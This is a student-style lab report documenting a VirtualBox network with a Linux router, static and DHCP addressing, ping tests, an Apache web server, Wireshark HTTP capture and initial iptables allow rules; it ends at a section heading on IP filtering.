# Network-Virtualization-Using-VirtualBox

## Introduction
The objective of this project is to establish a comprehensive virtual network infrastructure using VirtualBox. We configured routers, servers, and Linux clients, interconnected through specific virtual networks, and analyzed network traffic.
## Section 1: Environment Setup
### 1.1 Creation and Cloning of Virtual Machines
We created four virtual machines from a base Ubuntu image. To optimize disk space, we employed the linked cloning method and generated new MAC addresses to prevent network conflicts (ARP).

### 1.2 Configuration of Host-Only Networks
Three private virtual networks (Host-Only) were set up to isolate different segments of the project. The VirtualBox DHCP service was disabled to enable manual IP address configuration.

| Name                                      | IPv4 Prefix        | IPv6 Prefix | DHCP Server |
|-------------------------------------------|--------------------|-------------|-------------|
| VirtualBox Host-Only Ethernet Adapter     | 192.168.11.254/24  |             | Disabled    |
| VirtualBox Host-Only Ethernet Adapter #2  | 192.168.22.254/24  |             | Disabled    |
| VirtualBox Host-Only Ethernet Adapter #3  | 192.168.33.254/24  |             | Disabled    |

## Section 2: Network Configuration
### 2.1 Interface Verification
The ``ifconfig -a`` command on the router validated the presence of three network interfaces (eth0, eth1, eth2), each corresponding to a distinct subnet.
textstudent@student:~$ ifconfig -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:35:0e:a0
          inet6 addr: fe80::a00:27ff:fe35:ea0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:251 errors:0 dropped:0 overruns:0 frame:0
          TX packets:168 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:52952 (52.9 KB)  TX bytes:30579 (30.5 KB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:1c:5c:4a
          inet6 addr: fe80::a00:27ff:fe1c:5c4a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:133 errors:0 dropped:0 overruns:0 frame:0
          TX packets:169 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:27055 (27.0 KB)  TX bytes:31019 (31.0 KB)

eth2      Link encap:Ethernet  HWaddr 08:00:27:e4:28:a0
          inet6 addr: fe80::a00:27ff:fee4:28a0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:41 errors:0 dropped:0 overruns:0 frame:0
          TX packets:171 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4068 (4.0 KB)  TX bytes:31468 (31.4 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:16 errors:0 dropped:0 overruns:0 frame:0
          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:1184 (1.1 KB)  TX bytes:1184 (1.1 KB)

student@student:~$

## 2.2 Static IP Configuration
We edited the ``/etc/network/interfaces`` file to assign fixed IP addresses. The router serves as the default gateway for the other machines.
Router Configuration
text# interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.11.1
    netmask 255.255.255.0

auto eth1
iface eth1 inet static
    address 192.168.22.1
    netmask 255.255.255.0

auto eth2
iface eth2 inet static
    address 192.168.33.1
    netmask 255.255.255.0
textstudent@student:/etc/network$ ifconfig -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:35:0e:a0
          inet addr:192.168.11.1  Bcast:192.168.11.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe35:ea0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:783 errors:0 dropped:0 overruns:0 frame:0
          TX packets:664 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:183255 (183.2 KB)  TX bytes:123100 (123.1 KB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:1c:5c:4a
          inet addr:192.168.22.1  Bcast:192.168.22.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe1c:5c4a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:419 errors:0 dropped:0 overruns:0 frame:0
          TX packets:639 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:96476 (96.4 KB)  TX bytes:120881 (120.8 KB)

eth2      Link encap:Ethernet  HWaddr 08:00:27:e4:28:a0
          inet addr:192.168.33.1  Bcast:192.168.33.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fee4:28a0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:41 errors:0 dropped:0 overruns:0 frame:0
          TX packets:615 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4068 (4.0 KB)  TX bytes:116352 (116.3 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:512 errors:0 dropped:0 overruns:0 frame:0
          TX packets:512 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:38880 (38.8 KB)  TX bytes:38880 (38.8 KB)
PC1 Configuration
textGNU nano 2.2.6

#interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.11.10
    netmask 255.255.255.0
    gateway 192.168.11.1
textstudent@student:/etc/network$ ifconfig -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:2d:7d:53  
          inet addr:192.168.11.10  Bcast:192.168.11.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe2d:7d53/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:941 errors:0 dropped:0 overruns:0 frame:0
          TX packets:646 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:218905 (218.9 KB)  TX bytes:123879 (123.8 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:321 errors:0 dropped:0 overruns:0 frame:0
          TX packets:321 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:24079 (24.0 KB)  TX bytes:24079 (24.0 KB)

student@student:/etc/network$
Server Configuration
textGNU nano 2.2.6
#interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.11.2
    netmask 255.255.255.0
    gateway 192.168.11.1
textstudent@student:/etc/network$ ifconfig -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:d5:cd:5b  
          inet addr:192.168.11.2  Bcast:192.168.11.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fed5:cd5b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:881 errors:0 dropped:0 overruns:0 frame:0
          TX packets:657 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:208004 (208.0 KB)  TX bytes:125926 (125.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:313 errors:0 dropped:0 overruns:0 frame:0
          TX packets:313 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:23599 (23.5 KB)  TX bytes:23599 (23.5 KB)

student@student:/etc/network$
PC2 Configuration
text# interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.22.10
    netmask 255.255.255.0
    gateway 192.168.22.1
textstudent@student:/etc/network$ ifconfig -a
eth0      Link encap:Ethernet  HWaddr 08:00:27:64:27:ff
          inet addr:192.168.22.10  Bcast:192.168.22.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe64:27ff/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:595 errors:0 dropped:0 overruns:0 frame:0
          TX packets:761 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:138211 (138.2 KB)  TX bytes:145791 (145.7 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:321 errors:0 dropped:0 overruns:0 frame:0
          TX packets:321 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:24079 (24.0 KB)  TX bytes:24079 (24.0 KB)

student@student:/etc/network$
2.3 Routing Tables and Connectivity
The route -n command displays the kernel routing table. It shows the default gateway directed to the router, essential for inter-network communication.
textstudent@student:/etc/network$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
2.4 ARP Analysis
The arp -n command shows the IP-to-MAC address mapping table (layer 2). This confirms that machines exchanged local Ethernet frames before IP communication.
textstudent@student:/etc/network$ arp -n
Address           HWtype  HWaddress           Flags Mask            Iface
192.168.11.10     ether   08:00:27:2d:7d:53   C                   eth0
192.168.22.10     ether   08:00:27:64:27:ff   C                   eth1
192.168.33.10     ether   0a:00:27:00:00:37   C                   eth2
192.168.11.2      ether   08:00:27:d5:cd:5b   C                   eth0
student@student:/etc/network$
2.5 Routing Activation and Windows Routes
Initially, pings across different networks failed (Destination Host Unreachable). Two corrective measures were required:

Enabling IP Forwarding on the Linux router (via sysctl) to permit packet forwarding between interfaces.

textstudent@student:/etc/network$ sudo sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
student@student:/etc/network$ ping 192.168.33.10

Adding static routes on the Windows host (via route add) to route traffic to networks 11.0 and 22.0 through the virtual router (192.168.33.1).

textC:\Windows\System32>route add 192.168.11.0 mask 255.255.255.0 192.168.33.1
OK!

C:\Windows\System32>route add 192.168.22.0 mask 255.255.255.0 192.168.33.1
OK!

C:\Windows\System32>
Connectivity Tests

Server to Router Ping

textstudent@student:/etc/network$ ping 192.168.11.1
PING 192.168.11.1 (192.168.11.1) 56(84) bytes of data.
64 bytes from 192.168.11.1: icmp_seq=1 ttl=64 time=2.65 ms
64 bytes from 192.168.11.1: icmp_seq=2 ttl=64 time=1.44 ms
64 bytes from 192.168.11.1: icmp_seq=3 ttl=64 time=1.59 ms
64 bytes from 192.168.11.1: icmp_seq=4 ttl=64 time=1.51 ms
64 bytes from 192.168.11.1: icmp_seq=5 ttl=64 time=1.74 ms
64 bytes from 192.168.11.1: icmp_seq=6 ttl=64 time=4.14 ms
64 bytes from 192.168.11.1: icmp_seq=7 ttl=64 time=1.73 ms
64 bytes from 192.168.11.1: icmp_seq=8 ttl=64 time=3.08 ms
^C
--- 192.168.11.1 ping statistics ---
8 packets transmitted, 8 received, 0% packet loss, time 7016ms
rtt min/avg/max/mdev = 1.442/2.239/4.145/0.907 ms
student@student:/etc/network$

PC1 to Router Ping

textstudent@student:/etc/network$ ping 192.168.11.1
PING 192.168.11.1 (192.168.11.1) 56(84) bytes of data.
64 bytes from 192.168.11.1: icmp_seq=1 ttl=64 time=1.82 ms
64 bytes from 192.168.11.1: icmp_seq=2 ttl=64 time=1.57 ms
64 bytes from 192.168.11.1: icmp_seq=3 ttl=64 time=2.19 ms
64 bytes from 192.168.11.1: icmp_seq=4 ttl=64 time=3.82 ms
64 bytes from 192.168.11.1: icmp_seq=5 ttl=64 time=1.69 ms
^C
--- 192.168.11.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4009ms
rtt min/avg/max/mdev = 1.571/2.222/3.826/0.830 ms
student@student:/etc/network$

Ping Between PC1 and Server

textstudent@student:/etc/network$ ping 192.168.11.10
PING 192.168.11.10 (192.168.11.10) 56(84) bytes of data.
64 bytes from 192.168.11.10: icmp_seq=1 ttl=64 time=1.97 ms
64 bytes from 192.168.11.10: icmp_seq=2 ttl=64 time=1.30 ms
64 bytes from 192.168.11.10: icmp_seq=3 ttl=64 time=1.91 ms
64 bytes from 192.168.11.10: icmp_seq=4 ttl=64 time=1.20 ms
64 bytes from 192.168.11.10: icmp_seq=5 ttl=64 time=1.07 ms
^C
--- 192.168.11.10 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4019ms
rtt min/avg/max/mdev = 1.073/1.494/1.974/0.373 ms
student@student:/etc/network$ 

student@student:/etc/network$ ping 192.168.11.2
PING 192.168.11.2 (192.168.11.2) 56(84) bytes of data.
64 bytes from 192.168.11.2: icmp_seq=1 ttl=64 time=2.60 ms
64 bytes from 192.168.11.2: icmp_seq=2 ttl=64 time=1.25 ms
64 bytes from 192.168.11.2: icmp_seq=3 ttl=64 time=1.64 ms
64 bytes from 192.168.11.2: icmp_seq=4 ttl=64 time=1.16 ms
64 bytes from 192.168.11.2: icmp_seq=5 ttl=64 time=1.43 ms
64 bytes from 192.168.11.2: icmp_seq=6 ttl=64 time=1.29 ms
^C
--- 192.168.11.2 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5016ms
rtt min/avg/max/mdev = 1.168/1.568/2.607/0.489 ms

PC2 to Router Ping

textstudent@student:/etc/network$ ping 192.168.22.1
PING 192.168.22.1 (192.168.22.1) 56(84) bytes of data.
64 bytes from 192.168.22.1: icmp_seq=1 ttl=64 time=3.20 ms
64 bytes from 192.168.22.1: icmp_seq=2 ttl=64 time=1.32 ms
64 bytes from 192.168.22.1: icmp_seq=3 ttl=64 time=3.87 ms
64 bytes from 192.168.22.1: icmp_seq=4 ttl=64 time=2.32 ms
64 bytes from 192.168.22.1: icmp_seq=5 ttl=64 time=2.62 ms
^C
--- 192.168.22.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.323/2.670/3.873/0.857 ms
student@student:/etc/network$

PC3 to Router Ping

Sending a 'Ping' request to 192.168.33.1 with 32 bytes of data:
Response from 192.168.33.1: bytes=32 time<1ms TTL=64
Response from 192.168.33.1: bytes=32 time=1 ms TTL=64
Response from 192.168.33.1: bytes=32 time<1ms TTL=64
Response from 192.168.33.1: bytes=32 time<1ms TTL=64
Ping statistics for 192.168.33.1:
Packets: sent = 4, received = 4, lost = 0 (0% loss),
Approximate round trip times in milliseconds:
Minimum = 0ms, Maximum = 1ms, Average = 0ms

PC2 to PC3 Ping

textstudent@student:/etc/network$ ping 192.168.33.10
PING 192.168.33.10 (192.168.33.10) 56(84) bytes of data.
64 bytes from 192.168.33.10: icmp_seq=572 ttl=127 time=1.89 ms
64 bytes from 192.168.33.10: icmp_seq=573 ttl=127 time=3.10 ms
64 bytes from 192.168.33.10: icmp_seq=574 ttl=127 time=3.90 ms
64 bytes from 192.168.33.10: icmp_seq=575 ttl=127 time=1.71 ms
64 bytes from 192.168.33.10: icmp_seq=576 ttl=127 time=2.30 ms
64 bytes from 192.168.33.10: icmp_seq=577 ttl=127 time=2.69 ms
64 bytes from 192.168.33.10: icmp_seq=578 ttl=127 time=1.75 ms
64 bytes from 192.168.33.10: icmp_seq=579 ttl=127 time=3.01 ms
64 bytes from 192.168.33.10: icmp_seq=580 ttl=127 time=1.65 ms
64 bytes from 192.168.33.10: icmp_seq=581 ttl=127 time=2.96 ms
64 bytes from 192.168.33.10: icmp_seq=582 ttl=127 time=2.73 ms
^C

PC3 to PC2 Ping

textC:\Users\mhamd>ping 192.168.22.10

Sending a 'Ping' request to 192.168.22.10 with 32 bytes of data:
Response from 192.168.22.10: bytes=32 time=3 ms TTL=64
Response from 192.168.22.10: bytes=32 time<1ms TTL=64
Response from 192.168.22.10: bytes=32 time<1ms TTL=64
Response from 192.168.22.10: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.22.10:
    Packets: sent = 4, received = 4, lost = 0 (0% loss),
Approximate round trip times in milliseconds:
    Minimum = 0ms, Maximum = 3ms, Average = 0ms

PC3 to PC1 Ping

textC:\Users\mhamd>ping 192.168.11.10

Sending a 'Ping' request to 192.168.11.10 with 32 bytes of data:
Response from 192.168.11.10: bytes=32 time=2 ms TTL=64
Response from 192.168.11.10: bytes=32 time<1ms TTL=64
Response from 192.168.11.10: bytes=32 time<1ms TTL=64
Response from 192.168.11.10: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.11.10:
    Packets: sent = 4, received = 4, lost = 0 (0% loss),
Approximate round trip times in milliseconds:
    Minimum = 0ms, Maximum = 2ms, Average = 0ms
Section 3: DHCP Server Implementation
3.1 Prerequisites and Service Installation
To install the required package, we temporarily added a NAT interface to the router for internet access.
PCRouter Settings
Command: sudo apt-get install isc-dhcp-server
textstudent@student:~$ sudo apt-get install isc-dhcp-server
3.2 Network Re-addressing
As per project specifications for the DHCP section, we updated the IP addressing scheme for the router and virtual networks:

VMnet1: Shifted from 11.0 to 192.168.100.0/24
VMnet2: Shifted from 22.0 to 192.168.200.0/24

VirtualBox Host-Only Networks
3.3 Router Re-addressing
Following DHCP guidelines, address ranges were adjusted (192.168.100.0/24 and 192.168.200.0/24). Prior to DHCP setup, router interfaces were adapted as gateways for these new networks.
Modified /etc/network/interfaces file:
textinterfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.100.1
    netmask 255.255.255.0

auto eth1
iface eth1 inet static
    address 192.168.200.1
    netmask 255.255.255.0

auto eth2
iface eth2 inet static
    address 192.168.33.1
    netmask 255.255.255.0
We verified the new addresses using ifconfig.
texteth0      Link encap:Ethernet  HWaddr 08:00:27:35:0e:a0
          inet addr:192.168.100.1  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe35:ea0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:889 errors:0 dropped:0 overruns:0 frame:0
          TX packets:132 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:85966 (85.9 KB)  TX bytes:17456 (17.4 KB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:1c:5c:4a
          inet addr:192.168.200.1  Bcast:192.168.200.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe1c:5c4a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:112 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:486 (486.0 B)  TX bytes:15756 (15.7 KB)

eth2      Link encap:Ethernet  HWaddr 08:00:27:e4:28:a0
          inet addr:192.168.33.1  Bcast:192.168.33.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fee4:28a0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:486 (486.0 B)  TX bytes:15201 (15.2 KB)

eth3      Link encap:Ethernet  HWaddr 08:00:27:d7:2f:49
          inet addr:10.0.5.15  Bcast:10.0.5.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fed7:2f49/64 Scope:Link
          inet6 addr: fd17:625c:f037:5:9c5e:8f44:2154:c9c8/64 Scope:Global
          inet6 addr: fd17:625c:f037:5:a00:27ff:fed7:2f49/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:659 errors:0 dropped:0 overruns:0 frame:0
          TX packets:394 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:789252 (789.2 KB)  TX bytes:36388 (36.3 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
3.4 DHCP Server Configuration
The /etc/dhcp/dhcpd.conf configuration file was edited to define dynamic address ranges and network parameters for clients.
Configuration details:

Subnet 100.0: Range .100 to .200 with gateway 192.168.100.1.
Subnet 200.0: Range .100 to .200 with gateway 192.168.200.1.
Static Lease Reservation: Fixed address (192.168.100.2) reserved for the Server via its MAC address to ensure consistency.

textdefault-lease-time 600;
max-lease-time 7200;
authoritative;

subnet 192.168.100.0 netmask 255.255.255.0 {
  range 192.168.100.100 192.168.100.200;
  option routers 192.168.100.1;
  option domain-name-servers 8.8.8.8;
}

subnet 192.168.200.0 netmask 255.255.255.0 {
  range 192.168.200.100 192.168.200.200;
  option routers 192.168.100.1;
  option domain-name-servers 8.8.8.8;
}

host mon-serveur {
  hardware ethernet 08:00:27:d5:cd:5b;
  fixed-address 192.168.100.2;
}
Listening interfaces (eth0 and eth1) were specified in /etc/default/isc-dhcp-server.
text# Defaults for isc-dhcp-server initscript
# sourced by /etc/init.d/isc-dhcp-server
# installed at /etc/default/isc-dhcp-server by the maintainer scripts

#
# This is a POSIX shell fragment
#

# Path to dhcpd's config file (default: /etc/dhcp/dhcpd.conf).
#DHCPD_CONF=/etc/dhcp/dhcpd.conf

# Path to dhcpd's PID file (default: /var/run/dhcpd.pid).
#DHCPD_PID=/var/run/dhcpd.pid

# Additional options to start dhcpd with.
#     Don't use options -cf or -pf here; use DHCPD_CONF/ DHCPD_PID instead
#OPTIONS=""

# On what interfaces should the DHCP server (dhcpd) serve DHCP requests?
#       Separate multiple interfaces with spaces, e.g. "eth0 eth1".
INTERFACES="eth0 eth1"
3.5 DHCP Server Activation
After configuration and network restart, the DHCP service was activated to distribute addresses.
textstudent@student:/etc/network$ sudo service isc-dhcp-server restart
stop: Unknown instance:
isc-dhcp-server start/running, process 5889
student@student:/etc/network$
3.6 Client Configuration and Address Renewal
Clients (PC1 and PC2) were set to dynamic mode by modifying /etc/network/interfaces with iface eth0 inet dhcp.
text# interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
After network service restart, clients issued DHCPDISCOVER requests and received new addresses:

PC1: Assigned 192.168.100.100 via router's eth0.

textstudent@student:/etc/network$ sudo ifup -a
Internet Systems Consortium DHCP Client 4.2.4
Copyright 2004-2012 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/eth0/08:00:27:2d:7d:53
Sending on   LPF/eth0/08:00:27:2d:7d:53
Sending on   Socket/fallback
DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 3 (xid=0x13b5ae5f)
DHCPREQUEST of 192.168.100.100 on eth0 to 255.255.255.255 port 67 (xid=0x5faeb513)
DHCPOFFER of 192.168.100.100 from 192.168.100.1
DHCPACK of 192.168.100.100 from 192.168.100.1
bound to 192.168.100.100 -- renewal in 280 seconds.
student@student:/etc/network$ ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:2d:7d:53
          inet addr:192.168.100.100  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe2d:7d53/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3264 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3507 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:678583 (678.5 KB)  TX bytes:525493 (525.4 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1313 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1313 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:99503 (99.5 KB)  TX bytes:99503 (99.5 KB)

PC2: Assigned 192.168.200.100 via router's eth1.

textstudent@student:/etc/network$ sudo ifup -a
Internet Systems Consortium DHCP Client 4.2.4
Copyright 2004-2012 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/eth0/08:00:27:64:27:ff
Sending on   LPF/eth0/08:00:27:64:27:ff
Sending on   Socket/fallback
DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 3 (xid=0xd977d514)
DHCPREQUEST of 192.168.200.100 on eth0 to 255.255.255.255 port 67 (xid=0x14d577d9)
DHCPOFFER of 192.168.200.100 from 192.168.200.1
DHCPACK of 192.168.200.100 from 192.168.200.1
bound to 192.168.200.100 -- renewal in 222 seconds.
student@student:/etc/network$ ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:64:27:ff
          inet addr:192.168.200.100  Bcast:192.168.200.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe64:27ff/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1859 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3575 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:378350 (378.3 KB)  TX bytes:531227 (531.2 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1349 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1349 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:102767 (102.7 KB)  TX bytes:102767 (102.7 KB)

student@student:/etc/network$
3.7 Inter-Network Connectivity Validation
We confirmed routing functionality with dynamic addresses.

PC1 to PC2 Ping (192.168.200.100) succeeded, verifying correct gateway distribution by DHCP.

textstudent@student:/etc/network$ ping 192.168.200.100
PING 192.168.200.100 (192.168.200.100) 56(84) bytes of data.
64 bytes from 192.168.200.100: icmp_seq=1 ttl=63 time=4.39 ms
64 bytes from 192.168.200.100: icmp_seq=2 ttl=63 time=1.99 ms
64 bytes from 192.168.200.100: icmp_seq=3 ttl=63 time=3.81 ms
64 bytes from 192.168.200.100: icmp_seq=4 ttl=63 time=7.71 ms
^C
--- 192.168.200.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 1.999/4.480/7.716/2.067 ms
student@student:/etc/network$

PC2 to PC1 Ping (192.168.100.100) succeeded, verifying correct gateway distribution by DHCP.

textstudent@student:/etc/network$ ping 192.168.100.100
PING 192.168.100.100 (192.168.100.100) 56(84) bytes of data.
64 bytes from 192.168.100.100: icmp_seq=1 ttl=63 time=3.72 ms
64 bytes from 192.168.100.100: icmp_seq=2 ttl=63 time=3.96 ms
64 bytes from 192.168.100.100: icmp_seq=3 ttl=63 time=6.25 ms
64 bytes from 192.168.100.100: icmp_seq=4 ttl=63 time=3.57 ms
64 bytes from 192.168.100.100: icmp_seq=5 ttl=63 time=2.73 ms
^C
--- 192.168.100.100 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 2.733/4.049/6.252/1.179 ms
student@student:/etc/network$
Section 4: HTTP Server Setup and Analysis
4.1 Web Server Installation (Apache2)
With the server isolated on VMnet1, we temporarily enabled NAT for internet access to install packages.
Network Configuration
Command: sudo apt-get install apache2
textstudent@student:/etc/network$ sudo apt-get install apache2
Post-installation, the machine was reconnected to private network VMnet1 (192.168.100.0/24).
4.2 Web Page Deployment
A custom index.html file was created on the host. It was transferred to the Linux server using SSH via scp.
Command (on Windows prompt):
textscp index.html student@192.168.100.2:/home/student/
textC:\Users\mhamd\Desktop>scp index.html student@192.168.100.2:/home/student/
The authenticity of host '192.168.100.2 (192.168.100.2)' can't be established.
ED25519 key fingerprint is SHA256:aFX9+bRDMTeI2m75oGQs36/17msEkTbBuhLaFMuEeYU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
Please type 'yes', 'no' or the fingerprint:
Warning: Permanently added '192.168.100.2' (ED25519) to the list of known hosts.
student@192.168.100.2's password:
index.html                                              100%  111    27.1KB/s   00:00
C:\Users\mhamd\Desktop>
On the server, the file was moved to Apache's root:
textstudent@student:~$ sudo mv /home/student/index.html /var/www/html/index.html
[sudo] password for student:
4.3 Access Testing and Wireshark Analysis
From the host browser (PC3), we accessed http://192.168.100.2. The page displayed correctly.
Browser Screenshot
Wireshark analysis captured traffic on the virtual interface for network 33.10.
Wireshark HTTP Capture
Frame analysis revealed standard HTTP exchange:

Request: Client (192.168.33.10) sent GET / HTTP/1.1 for root page.
Response: Server (192.168.100.2) replied with 200 OK, including page HTML.

Section 5: Firewall Configuration with iptables
5.1 Initial Firewall State
Current configuration was checked using sudo iptables -L -v.
textstudent@student:~$ sudo iptables -L -v
[sudo] password for student:
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
student@student:~$
Default policy is ACCEPT for all chains (INPUT, FORWARD, OUTPUT), meaning no filtering—packets flow freely. This passive setup is risky in production.
5.2 Service Authorization (HTTP, HTTPS, SSH)
Explicit rules were added to permit protocols for web server operation and remote administration.
textstudent@student:~$ sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
student@student:~$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
student@student:~$ sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
student@student:~$
5.3 Specific IP Filtering
